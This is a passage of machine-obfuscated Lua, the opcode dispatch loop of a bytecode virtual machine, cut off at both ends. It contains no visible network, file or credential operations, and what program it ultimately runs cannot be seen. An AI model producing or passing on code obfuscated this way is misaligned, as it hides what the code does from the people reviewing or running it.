n=n+1;end end else if ba<=4 then if ba==3 then w[y[616]]=w[y[222]][y[728]];else n=n+1;end else if ba>5 then w[y[616]]=w[y[222]][y[728]];else y=f[n];end end end else if ba<=9 then if ba<=7 then n=n+1;else if 8==ba then y=f[n];else w[y[616]][y[222]]=w[y[728]];end end else if ba<=11 then if 11~=ba then n=n+1;else y=f[n];end else if 13>ba then n=y[222];else break end end end end ba=ba+1 end else local ba=0 while true do if ba<=14 then if ba<=6 then if ba<=2 then if ba<=0 then w={};else if ba==1 then for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;else n=n+1;end end else if ba<=4 then if ba~=4 then y=f[n];else w[y[616]]=h[y[222]];end else if 6>ba then n=n+1;else y=f[n];end end end else if ba<=10 then if ba<=8 then if 7<ba then n=n+1;else w[y[616]]=w[y[222]][y[728]];end else if 9==ba then y=f[n];else w[y[616]]=h[y[222]];end end else if ba<=12 then if ba<12 then n=n+1;else y=f[n];end else if 14~=ba then w[y[616]]={};else n=n+1;end end end end else if ba<=21 then if ba<=17 then if ba<=15 then y=f[n];else if 17>ba then w[y[616]]={};else n=n+1;end end else if ba<=19 then if 18<ba then w[y[616]][y[222]]=w[y[728]];else y=f[n];end else if 21~=ba then n=n+1;else y=f[n];end end end else if ba<=25 then if ba<=23 then if 22==ba then w[y[616]]=j[y[222]];else n=n+1;end else if ba~=25 then y=f[n];else w[y[616]]=w[y[222]][y[728]];end end else if ba<=27 then if 27~=ba then n=n+1;else y=f[n];end else if ba<29 then if w[y[616]]then n=n+1;else n=y[222];end;else break end end end end end ba=ba+1 end end;elseif(z<=105)then local ba,bb=0 while true do if(ba==8 or ba<8)then if(ba==3 or ba<3)then if(ba<1 or ba==1)then if not(1==ba)then bb=nil else w[y[616]]=w[y[222]][w[y[728]]];end else if not(3==ba)then n=n+1;else y=f[n];end end else if(ba<=5)then if(ba==4)then w[y[616]]=w[y[222]];else n=(n+1);end else if(ba==6 or ba<6)then y=f[n];else if(8>ba)then w[y[616]]=y[222];else n=n+1;end end end end else if(ba<13 or ba==13)then if(ba==10 or ba<10)then if not(10==ba)then y=f[n];else w[y[616]]=y[222];end else if(ba<11 or ba==11)then n=n+1;else if 12==ba then y=f[n];else w[y[616]]=y[222];end end end else if ba<=15 then if(15~=ba)then n=(n+1);else y=f[n];end else if(ba==16 or ba<16)then bb=y[616]else if(17==ba)then w[bb]=w[bb](r(w,(bb+1),y[222]))else break end end end end end ba=(ba+1)end elseif z<107 then local ba,bb=0 while true do if ba<=16 then if ba<=7 then if ba<=3 then if ba<=1 then if 1~=ba then bb=nil else w[y[616]]=w[y[222]][y[728]];end else if ba<3 then n=n+1;else y=f[n];end end else if ba<=5 then if 5>ba then w[y[616]]=h[y[222]];else n=n+1;end else if 7>ba then y=f[n];else w[y[616]]=w[y[222]][y[728]];end end end else if ba<=11 then if ba<=9 then if 9>ba then n=n+1;else y=f[n];end else if 11~=ba then w[y[616]]={};else n=n+1;end end else if ba<=13 then if ba<13 then y=f[n];else w[y[616]]=h[y[222]];end else if ba<=14 then n=n+1;else if 16~=ba then y=f[n];else w[y[616]]=w[y[222]][y[728]];end end end end end else if ba<=24 then if ba<=20 then if ba<=18 then if 17==ba then n=n+1;else y=f[n];end else if ba>19 then n=n+1;else w[y[616]]=h[y[222]];end end else if ba<=22 then if ba~=22 then y=f[n];else w[y[616]]={};end else if 24>ba then n=n+1;else y=f[n];end end end else if ba<=28 then if ba<=26 then if 25==ba then w[y[616]]=h[y[222]];else n=n+1;end else if 28>ba then y=f[n];else w[y[616]]=w[y[222]][y[728]];end end else if ba<=30 then if ba==29 then n=n+1;else y=f[n];end else if ba<=31 then bb=y[616]else if 33>ba then w[bb]=w[bb]()else break end end end end end end ba=ba+1 end else local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if ba==0 then bb=nil else bc=nil end else if ba<=2 then bd=nil else if 3<ba then n=n+1;else w[y[616]]=h[y[222]];end end end else if ba<=6 then if ba>5 then w[y[616]]=h[y[222]];else y=f[n];end else if ba<=7 then n=n+1;else if 8<ba then w[y[616]]=w[y[222]][y[728]];else y=f[n];end end end end else if ba<=14 then if ba<=11 then if 10<ba then y=f[n];else n=n+1;end else if ba<=12 then w[y[616]]=w[y[222]][w[y[728]]];else if 14~=ba then n=n+1;else y=f[n];end end end else if ba<=16 then if 16>ba then bd=y[616]else bc={w[bd](w[bd+1])};end else if ba<=17 then bb=0;else if ba~=19 then for be=bd,y[728]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end end;elseif 113>=z then if(z<=110)then if 108>=z then local ba,bb,bc,bd=0 while true do if ba<=10 then if(ba==4 or ba<4)then if(ba<=1)then if not(1==ba)then bb=nil else bc=nil end else if ba<=2 then bd=nil else if(ba>3)then n=(n+1);else w[y[616]]=h[y[222]];end end end else if(ba<=7)then if(ba<=5)then y=f[n];else if not(ba==7)then w[y[616]]=w[y[222]][y[728]];else n=(n+1);end end else if ba<=8 then y=f[n];else if not(9~=ba)then w[y[616]]=w[y[222]][y[728]];else n=(n+1);end end end end else if(ba==16 or ba<16)then if(ba<13 or ba==13)then if(ba==11 or ba<11)then y=f[n];else if ba>12 then n=(n+1);else w[y[616]]=h[y[222]];end end else if(ba<14 or ba==14)then y=f[n];else if(15<ba)then n=n+1;else w[y[616]]=w[y[222]][y[728]];end end end else if(ba<19 or ba==19)then if ba<=17 then y=f[n];else if 18<ba then bc=y[728];else bd=y[222];end end else if(ba<20 or ba==20)then bb=k(w,g,bd,bc);else if 22~=ba then w[y[616]]=bb;else break end end end end end ba=ba+1 end elseif z<110 then local ba,bb=0 while true do if ba<=12 then if ba<=5 then if ba<=2 then if ba<=0 then bb=nil else if ba<2 then w={};else for bc=0,u,1 do if bc<o then w[bc]=s[bc+1];else break;end;end;end end else if ba<=3 then n=n+1;else if 5~=ba then y=f[n];else w[y[616]]=h[y[222]];end end end else if ba<=8 then if ba<=6 then n=n+1;else if 8~=ba then y=f[n];else w[y[616]]=j[y[222]];end end else if ba<=10 then if ba<10 then n=n+1;else y=f[n];end else if 11==ba then w[y[616]]=w[y[222]][y[728]];else n=n+1;end end end end else if ba<=18 then if ba<=15 then if ba<=13 then y=f[n];else if ba<15 then w[y[616]]=y[222];else n=n+1;end end else if ba<=16 then y=f[n];else if ba~=18 then w[y[616]]=y[222];else n=n+1;end end end else if ba<=21 then if ba<=19 then y=f[n];else if ba==20 then w[y[616]]=y[222];else n=n+1;end end else if ba<=23 then if ba<23 then y=f[n];else bb=y[616]end else if 25~=ba then w[bb]=w[bb](r(w,bb+1,y[222]))else break end end end end end ba=ba+1 end else local ba,bb=0 while true do if ba<=17 then if ba<=8 then if ba<=3 then if ba<=1 then if ba>0 then w={};else bb=nil end else if ba==2 then for bc=0,u,1 do if bc<o then w[bc]=s[bc+1];else break;end;end;else n=n+1;end end else if ba<=5 then if ba<5 then y=f[n];else w[y[616]]={};end else if ba<=6 then n=n+1;else if 7<ba then w[y[616]]=h[y[222]];else y=f[n];end end end end else if ba<=12 then if ba<=10 then if ba==9 then n=n+1;else y=f[n];end else if ba>11 then n=n+1;else w[y[616]]=w[y[222]][y[728]];end end else if ba<=14 then if 14~=ba then y=f[n];else w[y[616]]=h[y[222]];end else if ba<=15 then n=n+1;else if 16<ba then w[y[616]]=w[y[222]][y[728]];else y=f[n];end end end end end else if ba<=26 then if ba<=21 then if ba<=19 then if 18==ba then n=n+1;else y=f[n];end else if 20==ba then w[y[616]]={};else n=n+1;end end else if ba<=23 then if 22==ba then y=f[n];else w[y[616]]=y[222];end else if ba<=24 then n=n+1;else if 26>ba then y=f[n];else w[y[616]]=y[222];end end end end else if ba<=30 then if ba<=28 then if 27<ba then y=f[n];else n=n+1;end else if 29==ba then w[y[616]]=y[222];else n=n+1;end end else if ba<=32 then if 31<ba then bb=y[616];else y=f[n];end else if ba<=33 then w[bb]=w[bb]-w[bb+2];else if ba~=35 then n=y[222];else break end end end end end end ba=ba+1 end end;elseif 111>=z then local ba=0 while true do if ba<=6 then if ba<=2 then if ba<=0 then w[y[616]]=w[y[222]][y[728]];else if 1<ba then y=f[n];else n=n+1;end end else if ba<=4 then if 4~=ba then w[y[616]]=w[y[222]][y[728]];else n=n+1;end else if ba<6 then y=f[n];else w[y[616]]=w[y[222]][y[728]];end end end else if ba<=9 then if ba<=7 then n=n+1;else if ba<9 then y=f[n];else w[y[616]]=w[y[222]][y[728]];end end else if ba<=11 then if ba==10 then n=n+1;else y=f[n];end else if 12<ba then break else if w[y[616]]then n=n+1;else n=y[222];end;end end end end ba=ba+1 end elseif not(112~=z)then local ba,bb=0 while true do if ba<=8 then if ba<=3 then if ba<=1 then if ba<1 then bb=nil else w[y[616]]=j[y[222]];end else if ba<3 then n=n+1;else y=f[n];end end else if ba<=5 then if 5>ba then w[y[616]]=w[y[222]][y[728]];else n=n+1;end else if ba<=6 then y=f[n];else if 8~=ba then w[y[616]]=y[222];else n=n+1;end end end end else if ba<=13 then if ba<=10 then if 10>ba then y=f[n];else w[y[616]]=y[222];end else if ba<=11 then n=n+1;else if 12<ba then w[y[616]]=y[222];else y=f[n];end end end else if ba<=15 then if ba<15 then n=n+1;else y=f[n];end else if ba<=16 then bb=y[616]else if ba==17 then w[bb]=w[bb](r(w,bb+1,y[222]))else break end end end end end ba=ba+1 end else local ba,bb,bc,bd,be,bf=0 while true do if ba<=3 then if ba<=1 then if 0==ba then bb=y[616]else bc=y[728]end else if 2==ba then bd=bb+2 else be={w[bb](w[bb+1],w[bd])}end end else if ba<=5 then if 4==ba then for bg=1,bc do w[bd+bg]=be[bg];end else bf=w[bb+3]end else if ba~=7 then if bf then w[bd]=bf;n=y[222];else n=n+1 end;else break end end end ba=ba+1 end end;elseif(116==z or 116>z)then if((z==114)or z<114)then local ba,bb=0 while true do if(ba==7 or ba<7)then if(ba<3 or ba==3)then if(ba<1 or ba==1)then if(ba<1)then bb=nil else w[y[616]]=h[y[222]];end else if ba<3 then n=(n+1);else y=f[n];end end else if(ba==5 or ba<5)then if(ba>4)then n=(n+1);else w[y[616]]=y[222];end else if not(ba~=6)then y=f[n];else w[y[616]]=y[222];end end end else if(ba==11 or ba<11)then if(ba<=9)then if(9>ba)then n=n+1;else y=f[n];end else if not(ba==11)then w[y[616]]=y[222];else n=n+1;end end else if ba<=13 then if not(ba~=12)then y=f[n];else bb=y[616]end else if(14<ba)then break else w[bb]=w[bb](r(w,(bb+1),y[222]))end end end end ba=(ba+1)end elseif(z>115)then local ba,bb,bc,bd=0 while true do if(ba==9 or ba<9)then if(ba==4 or ba<4)then if(ba<=1)then if not(ba~=0)then bb=nil else bc=nil end else if(ba<2 or ba==2)then bd=nil else if ba~=4 then w[y[616]]=h[y[222]];else n=(n+1);end end end else if(ba<=6)then if 5==ba then y=f[n];else w[y[616]]=h[y[222]];end else if(ba==7 or ba<7)then n=(n+1);else if(ba>8)then w[y[616]]=w[y[222]][y[728]];else y=f[n];end end end end else if(ba<14 or ba==14)then if(ba<11 or ba==11)then if 11>ba then n=(n+1);else y=f[n];end else if(ba==12 or ba<12)then w[y[616]]=w[y[222]][w[y[728]]];else if(13==ba)then n=(n+1);else y=f[n];end end end else if ba<=16 then if(16~=ba)then bd=y[616]else bc={w[bd](w[bd+1])};end else if(ba<=17)then bb=0;else if 19~=ba then for be=bd,y[728]do bb=(bb+1);w[be]=bc[bb];end else break end end end end end ba=ba+1 end else local ba,bb=0 while true do if(ba<=79)then if(ba<=39)then if ba<=19 then if(ba<=9)then if(ba<4 or ba==4)then if(ba==1 or ba<1)then if not(0~=ba)then bb=nil else w[y[616]]=h[y[222]];end else if(ba<=2)then n=n+1;else if(ba<4)then y=f[n];else w[y[616]]=w[y[222]][y[728]];end end end else if(ba==6 or ba<6)then if(6>ba)then n=n+1;else y=f[n];end else if(ba<=7)then w[y[616]]=h[y[222]];else if not(9==ba)then n=(n+1);else y=f[n];end end end end else if(ba==14 or ba<14)then if ba<=11 then if(10==ba)then w[y[616]]=w[y[222]][y[728]];else n=n+1;end else if(ba<=12)then y=f[n];else if(13<ba)then n=n+1;else w[y[616]][w[y[222]]]=w[y[728]];end end end else if(ba<16 or ba==16)then if(16>ba)then y=f[n];else w[y[616]]=h[y[222]];end else if(ba<17 or ba==17)then n=n+1;else if(ba>18)then w[y[616]]=w[y[222]][y[728]];else y=f[n];end end end end end else if ba<=29 then if ba<=24 then if(ba<21 or ba==21)then if not(21==ba)then n=(n+1);else y=f[n];end else if ba<=22 then w[y[616]]=h[y[222]];else if ba<24 then n=n+1;else y=f[n];end end end else if(ba<=26)then if not(26==ba)then w[y[616]]=w[y[222]][y[728]];else n=(n+1);end else if(ba<27 or ba==27)then y=f[n];else if(28<ba)then n=n+1;else w[y[616]][w[y[222]]]=w[y[728]];end end end end else if(ba<=34)then if ba<=31 then if ba<31 then y=f[n];else w[y[616]]=h[y[222]];end else if ba<=32 then n=(n+1);else if ba==33 then y=f[n];else w[y[616]]=w[y[222]][y[728]];end end end else if(ba<36 or ba==36)then if(36>ba)then n=(n+1);else y=f[n];end else if(ba<=37)then w[y[616]]=h[y[222]];else if not(38~=ba)then n=(n+1);else y=f[n];end end end end end end else if ba<=59 then if ba<=49 then if(ba<=44)then if(ba<=41)then if not(40~=ba)then w[y[616]]=w[y[222]][y[728]];else n=(n+1);end else if ba<=42 then y=f[n];else if(ba~=44)then w[y[616]][w[y[222]]]=w[y[728]];else n=(n+1);end end end else if ba<=46 then if not(ba==46)then y=f[n];else w[y[616]]=h[y[222]];end else if(ba==47 or ba<47)then n=n+1;else if not(49==ba)then y=f[n];else w[y[616]]=w[y[222]][y[728]];end end end end else if(ba<=54)then if(ba==51 or ba<51)then if(51~=ba)then n=n+1;else y=f[n];end else if(ba<52 or ba==52)then w[y[616]]=h[y[222]];else if(53==ba)then n=(n+1);else y=f[n];end end end else if(ba<=56)then if(ba<56)then w[y[616]]=w[y[222]][y[728]];else n=(n+1);end else if(ba<57 or ba==57)then y=f[n];else if ba~=59 then w[y[616]][w[y[222]]]=w[y[728]];else n=(n+1);end end end end end else if ba<=69 then if ba<=64 then if(ba<61 or ba==61)then if(61>ba)then y=f[n];else w[y[616]]=h[y[222]];end else if ba<=62 then n=n+1;else if(ba>63)then w[y[616]]=w[y[222]][y[728]];else y=f[n];end end end else if(ba==66 or ba<66)then if(ba>65)then y=f[n];else n=(n+1);end else if(ba==67 or ba<67)then w[y[616]]=h[y[222]];else if(69>ba)then n=n+1;else y=f[n];end end end end else if(ba==74 or ba<74)then if(ba==71 or ba<71)then if ba~=71 then w[y[616]]=w[y[222]][y[728]];else n=n+1;end else if(ba<=72)then y=f[n];else if ba<74 then w[y[616]][w[y[222]]]=w[y[728]];else n=(n+1);end end end else if(ba<=76)then if ba<76 then y=f[n];else w[y[616]]=h[y[222]];end else if(ba<77 or ba==77)then n=n+1;else if not(ba~=78)then y=f[n];else w[y[616]]=w[y[222]][y[728]];end end end end end end end else if(ba<119 or ba==119)then if(ba<=99)then if(ba==89 or ba<89)then if(ba==84 or ba<84)then if(ba==81 or ba<81)then if(ba>80)then y=f[n];else n=(n+1);end else if(ba<=82)then w[y[616]]=h[y[222]];else if(83==ba)then n=(n+1);else y=f[n];end end end else if(ba==86 or ba<86)then if not(86==ba)then w[y[616]]=w[y[222]][y[728]];else n=(n+1);end else if(ba<87 or ba==87)then y=f[n];else if not(ba~=88)then w[y[616]][w[y[222]]]=w[y[728]];else n=(n+1);end end end end else if(ba<94 or ba==94)then if(ba<91 or ba==91)then if not(90~=ba)then y=f[n];else w[y[616]]=h[y[222]];end else if(ba==92 or ba<92)then n=(n+1);else if not(ba~=93)then y=f[n];else w[y[616]]=w[y[222]][y[728]];end end end else if ba<=96 then if(ba>95)then y=f[n];else n=(n+1);end else if(ba<=97)then w[y[616]]=h[y[222]];else if ba>98 then y=f[n];else n=(n+1);end end end end end else if(ba<109 or ba==109)then if(ba==104 or ba<104)then if ba<=101 then if 101>ba then w[y[616]]=w[y[222]][y[728]];else n=(n+1);end else if ba<=102 then y=f[n];else if not(ba==104)then w[y[616]][w[y[222]]]=w[y[728]];else n=n+1;end end end else if(ba<106 or ba==106)then if 105<ba then w[y[616]]=h[y[222]];else y=f[n];end else if(ba==107 or ba<107)then n=(n+1);else if ba>108 then w[y[616]]=w[y[222]][y[728]];else y=f[n];end end end end else if(ba==114 or ba<114)then if(ba<=111)then if not(110~=ba)then n=(n+1);else y=f[n];end else if(ba==112 or ba<112)then w[y[616]]=h[y[222]];else if 113==ba then n=(n+1);else y=f[n];end end end else if ba<=116 then if(ba~=116)then w[y[616]]=w[y[222]][y[728]];else n=(n+1);end else if(ba<117 or ba==117)then y=f[n];else if not(119==ba)then w[y[616]][w[y[222]]]=w[y[728]];else n=n+1;end end end end end end else if ba<=139 then if(ba<=129)then if ba<=124 then if(ba<121 or ba==121)then if not(121==ba)then y=f[n];else w[y[616]]=h[y[222]];end else if(ba<=122)then n=(n+1);else if 124>ba then y=f[n];else w[y[616]]=w[y[222]][y[728]];end end end else if(ba<=126)then if(ba>125)then y=f[n];else n=n+1;end else if(ba==127 or ba<127)then w[y[616]]=h[y[222]];else if(128==ba)then n=(n+1);else y=f[n];end end end end else if(ba==134 or ba<134)then if(ba<=131)then if not(130~=ba)then w[y[616]]=w[y[222]][y[728]];else n=(n+1);end else if(ba==132 or ba<132)then y=f[n];else if not(134==ba)then w[y[616]][w[y[222]]]=w[y[728]];else n=n+1;end end end else if ba<=136 then if not(ba~=135)then y=f[n];else w[y[616]]=h[y[222]];end else if ba<=137 then n=(n+1);else if 139>ba then y=f[n];else w[y[616]]=w[y[222]][y[728]];end end end end end else if(ba<149 or ba==149)then if(ba<=144)then if(ba<=141)then if(ba>140)then y=f[n];else n=(n+1);end else if(ba<=142)then w[y[616]]=h[y[222]];else if(144>ba)then n=(n+1);else y=f[n];end end end else if(ba<=146)then if not(ba~=145)then w[y[616]]=w[y[222]][y[728]];else n=n+1;end else if ba<=147 then y=f[n];else if(ba==148)then w[y[616]][w[y[222]]]=w[y[728]];else n=n+1;end end end end else if(ba<154 or ba==154)then if ba<=151 then if not(151==ba)then y=f[n];else w[y[616]]=j[y[222]];end else if(ba<=152)then n=n+1;else if(153<ba)then w[y[616]]=w[y[222]];else y=f[n];end end end else if ba<=156 then if 156~=ba then n=n+1;else y=f[n];end else if ba<=157 then bb=y[616]else if(ba~=159)then w[bb]=w[bb](w[(bb+1)])else break end end end end end end end end ba=(ba+1)end end;elseif 117>=z then local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if ba~=1 then bb=nil else w[y[616]]=w[y[222]][y[728]];end else if ba~=3 then n=n+1;else y=f[n];end end else if ba<=5 then if 4<ba then n=n+1;else w[y[616]]=y[222];end else if ba==6 then y=f[n];else w[y[616]]=y[222];end end end else if ba<=11 then if ba<=9 then if ba~=9 then n=n+1;else y=f[n];end else if 10<ba then n=n+1;else w[y[616]]=y[222];end end else if ba<=13 then if ba==12 then y=f[n];else bb=y[616]end else if ba~=15 then w[bb]=w[bb](r(w,bb+1,y[222]))else break end end end end ba=ba+1 end elseif not(z~=118)then w[y[616]][y[222]]=y[728];else local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if ba>0 then w[y[616]]=w[y[222]];else bb=nil end else if 3~=ba then n=n+1;else y=f[n];end end else if ba<=5 then if 5>ba then w[y[616]]=y[222];else n=n+1;end else if 7>ba then y=f[n];else w[y[616]]=y[222];end end end else if ba<=11 then if ba<=9 then if 8<ba then y=f[n];else n=n+1;end else if 10==ba then w[y[616]]=y[222];else n=n+1;end end else if ba<=13 then if ba==12 then y=f[n];else bb=y[616]end else if 15~=ba then w[bb]=w[bb](r(w,bb+1,y[222]))else break end end end end ba=ba+1 end end;elseif z<=131 then if 125>=z then if z<=122 then if(z==120 or z<120)then local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if 0<ba then bc=nil else bb=nil end else if ba<=2 then bd=nil else if 4~=ba then w[y[616]]=h[y[222]];else n=n+1;end end end else if ba<=6 then if ba==5 then y=f[n];else w[y[616]]=h[y[222]];end else if ba<=7 then n=n+1;else if ba>8 then w[y[616]]=w[y[222]][y[728]];else y=f[n];end end end end else if ba<=14 then if ba<=11 then if 10<ba then y=f[n];else n=n+1;end else if ba<=12 then w[y[616]]=w[y[222]][w[y[728]]];else if ba>13 then y=f[n];else n=n+1;end end end else if ba<=16 then if ba==15 then bd=y[616]else bc={w[bd](w[bd+1])};end else if ba<=17 then bb=0;else if ba~=19 then for be=bd,y[728]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end elseif(121==z)then w[y[616]]=w[y[222]]-y[728];else local ba=0 while true do if ba<=6 then if ba<=2 then if ba<=0 then w[y[616]]=w[y[222]][y[728]];else if ba~=2 then n=n+1;else y=f[n];end end else if ba<=4 then if 3<ba then n=n+1;else w[y[616]]=w[y[222]][y[728]];end else if 5<ba then w[y[616]]=w[y[222]][y[728]];else y=f[n];end end end else if ba<=9 then if ba<=7 then n=n+1;else if 9~=ba then y=f[n];else w[y[616]][y[222]]=w[y[728]];end end else if ba<=11 then if ba~=11 then n=n+1;else y=f[n];end else if 12<ba then break else n=y[222];end end end end ba=ba+1 end end;elseif(z==123 or z<123)then local ba=0 while true do if ba<=6 then if ba<=2 then if ba<=0 then w[y[616]]=w[y[222]][y[728]];else if ba<2 then n=n+1;else y=f[n];end end else if ba<=4 then if 4~=ba then w[y[616]]=w[y[222]][y[728]];else n=n+1;end else if 6>ba then y=f[n];else w[y[616]]=w[y[222]][y[728]];end end end else if ba<=9 then if ba<=7 then n=n+1;else if 9>ba then y=f[n];else w[y[616]]=w[y[222]][y[728]];end end else if ba<=11 then if ba~=11 then n=n+1;else y=f[n];end else if ba>12 then break else w[y[616]]=w[y[222]][w[y[728]]];end end end end ba=ba+1 end elseif z>124 then a(c,e);else local ba,bb=0 while true do if ba<=8 then if ba<=3 then if ba<=1 then if 0==ba then bb=nil else w[y[616]]=w[y[222]][y[728]];end else if 2<ba then y=f[n];else n=n+1;end end else if ba<=5 then if ba>4 then n=n+1;else w[y[616]]=w[y[222]][y[728]];end else if ba<=6 then y=f[n];else if 8>ba then w[y[616]]=w[y[222]][y[728]];else n=n+1;end end end end else if ba<=13 then if ba<=10 then if ba~=10 then y=f[n];else w[y[616]]=w[y[222]][y[728]];end else if ba<=11 then n=n+1;else if 13~=ba then y=f[n];else w[y[616]]=false;end end end else if ba<=15 then if 14==ba then n=n+1;else y=f[n];end else if ba<=16 then bb=y[616]else if ba==17 then w[bb](w[bb+1])else break end end end end end ba=ba+1 end end;elseif(z==128 or z<128)then if 126>=z then w[y[616]]=false;n=(n+1);elseif z>127 then local ba,bb=0 while true do if ba<=10 then if ba<=4 then if ba<=1 then if 0<ba then w[y[616]]=j[y[222]];else bb=nil end else if ba<=2 then n=n+1;else if ba~=4 then y=f[n];else w[y[616]]=w[y[222]][y[728]];end end end else if ba<=7 then if ba<=5 then n=n+1;else if 7>ba then y=f[n];else w[y[616]]=y[222];end end else if ba<=8 then n=n+1;else if 10~=ba then y=f[n];else w[y[616]]=y[222];end end end end else if ba<=15 then if ba<=12 then if 12>ba then n=n+1;else y=f[n];end else if ba<=13 then w[y[616]]=y[222];else if 14<ba then y=f[n];else n=n+1;end end end else if ba<=18 then if ba<=16 then w[y[616]]=y[222];else if 17==ba then n=n+1;else y=f[n];end end else if ba<=19 then bb=y[616]else if 21~=ba then w[bb]=w[bb](r(w,bb+1,y[222]))else break end end end end end ba=ba+1 end else local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if 1~=ba then bb=nil else w[y[616]]=h[y[222]];end else if ba~=3 then n=n+1;else y=f[n];end end else if ba<=5 then if ba==4 then w[y[616]]=w[y[222]][y[728]];else n=n+1;end else if ba>6 then w[y[616]]=y[222];else y=f[n];end end end else if ba<=11 then if ba<=9 then if 9~=ba then n=n+1;else y=f[n];end else if 11~=ba then w[y[616]]=y[222];else n=n+1;end end else if ba<=13 then if ba==12 then y=f[n];else bb=y[616]end else if ba<15 then w[bb]=w[bb](r(w,bb+1,y[222]))else break end end end end ba=ba+1 end end;elseif(z==129 or z<129)then local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if 0<ba then bc=nil else bb=nil end else if ba<=2 then bd=nil else if ba<4 then w[y[616]]=h[y[222]];else n=n+1;end end end else if ba<=6 then if 5<ba then w[y[616]]=h[y[222]];else y=f[n];end else if ba<=7 then n=n+1;else if 8==ba then y=f[n];else w[y[616]]=w[y[222]][y[728]];end end end end else if ba<=14 then if ba<=11 then if 11>ba then n=n+1;else y=f[n];end else if ba<=12 then w[y[616]]=w[y[222]][w[y[728]]];else if 13<ba then y=f[n];else n=n+1;end end end else if ba<=16 then if 16>ba then bd=y[616]else bc={w[bd](w[bd+1])};end else if ba<=17 then bb=0;else if 18==ba then for be=bd,y[728]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end elseif 130==z then local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if ba<1 then bb=nil else bc=nil end else if ba<=2 then bd=nil else if 4~=ba then w[y[616]]=h[y[222]];else n=n+1;end end end else if ba<=6 then if ba~=6 then y=f[n];else w[y[616]]=h[y[222]];end else if ba<=7 then n=n+1;else if ba~=9 then y=f[n];else w[y[616]]=w[y[222]][y[728]];end end end end else if ba<=14 then if ba<=11 then if 10==ba then n=n+1;else y=f[n];end else if ba<=12 then w[y[616]]=w[y[222]][w[y[728]]];else if ba==13 then n=n+1;else y=f[n];end end end else if ba<=16 then if ba~=16 then bd=y[616]else bc={w[bd](w[bd+1])};end else if ba<=17 then bb=0;else if ba~=19 then for be=bd,y[728]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end else local ba=y[616];local bb=w[ba];for bc=ba+1,p do t(bb,w[bc])end;end;elseif(137>z or 137==z)then if(134==z or 134>z)then if(z<132 or z==132)then local ba=y[616];p=ba+x-1;for bb=ba,p do local ba=q[bb-ba];w[bb]=ba;end;elseif z<134 then if(w[y[616]]<w[y[728]])then n=n+1;else n=y[222];end;else local ba=y[616]local bb={w[ba](r(w,ba+1,p))};local bc=0;for bd=ba,y[728]do bc=(bc+1);w[bd]=bb[bc];end end;elseif(z<=135)then local ba,bb,bc=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if ba>0 then bc=nil else bb=nil end else if ba<=2 then w={};else if 4~=ba then for bd=0,u,1 do if bd<o then w[bd]=s[bd+1];else break;end;end;else n=n+1;end end end else if ba<=6 then if ba<6 then y=f[n];else w[y[616]]=j[y[222]];end else if ba<=7 then n=n+1;else if ba~=9 then y=f[n];else w[y[616]]=j[y[222]];end end end end else if ba<=14 then if ba<=11 then if 10<ba then y=f[n];else n=n+1;end else if ba<=12 then w[y[616]]=w[y[222]][y[728]];else if 14~=ba then n=n+1;else y=f[n];end end end else if ba<=16 then if ba~=16 then bc=y[616];else bb=w[y[222]];end else if ba<=17 then w[bc+1]=bb;else if 19~=ba then w[bc]=bb[y[728]];else break end end end end end ba=ba+1 end elseif z~=137 then local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if ba==0 then bb=nil else w[y[616]]=h[y[222]];end else if ba~=3 then n=n+1;else y=f[n];end end else if ba<=5 then if ba<5 then w[y[616]]=y[222];else n=n+1;end else if ba<7 then y=f[n];else w[y[616]]=y[222];end end end else if ba<=11 then if ba<=9 then if ba~=9 then n=n+1;else y=f[n];end else if 11>ba then w[y[616]]=y[222];else n=n+1;end end else if ba<=13 then if ba>12 then bb=y[616]else y=f[n];end else if ba~=15 then w[bb]=w[bb](r(w,bb+1,y[222]))else break end end end end ba=ba+1 end else w[y[616]][y[222]]=y[728];end;elseif(z==140 or z<140)then if(138>z or 138==z)then w[y[616]]=(w[y[222]]/y[728]);elseif 139<z then w[y[616]]=(w[y[222]]-w[y[728]]);else local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if 1~=ba then bb=nil else bc=nil end else if ba<=2 then bd=nil else if ba==3 then w[y[616]]=j[y[222]];else n=n+1;end end end else if ba<=6 then if ba>5 then w[y[616]]=w[y[222]][y[728]];else y=f[n];end else if ba<=7 then n=n+1;else if 9>ba then y=f[n];else w[y[616]]=w[y[222]][y[728]];end end end end else if ba<=14 then if ba<=11 then if 11>ba then n=n+1;else y=f[n];end else if ba<=12 then w[y[616]]=w[y[222]][y[728]];else if 14~=ba then n=n+1;else y=f[n];end end end else if ba<=16 then if ba<16 then bd=y[616]else bc={w[bd](w[bd+1])};end else if ba<=17 then bb=0;else if 19~=ba then for be=bd,y[728]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end end;elseif(141==z or 141>z)then local ba,bb,bc,bd=0 while true do if(ba==9 or ba<9)then if(ba==4 or ba<4)then if ba<=1 then if(1>ba)then bb=nil else bc=nil end else if(ba<=2)then bd=nil else if ba~=4 then w[y[616]]=j[y[222]];else n=n+1;end end end else if(ba<=6)then if not(6==ba)then y=f[n];else w[y[616]]=w[y[222]][y[728]];end else if(ba==7 or ba<7)then n=(n+1);else if(9>ba)then y=f[n];else w[y[616]]=w[y[222]][y[728]];end end end end else if(ba<=14)then if ba<=11 then if not(10~=ba)then n=(n+1);else y=f[n];end else if ba<=12 then w[y[616]]=w[y[222]][y[728]];else if ba==13 then n=n+1;else y=f[n];end end end else if ba<=16 then if ba>15 then bc={w[bd](w[bd+1])};else bd=y[616]end else if(ba==17 or ba<17)then bb=0;else if not(ba~=18)then for be=bd,y[728]do bb=(bb+1);w[be]=bc[bb];end else break end end end end end ba=ba+1 end elseif 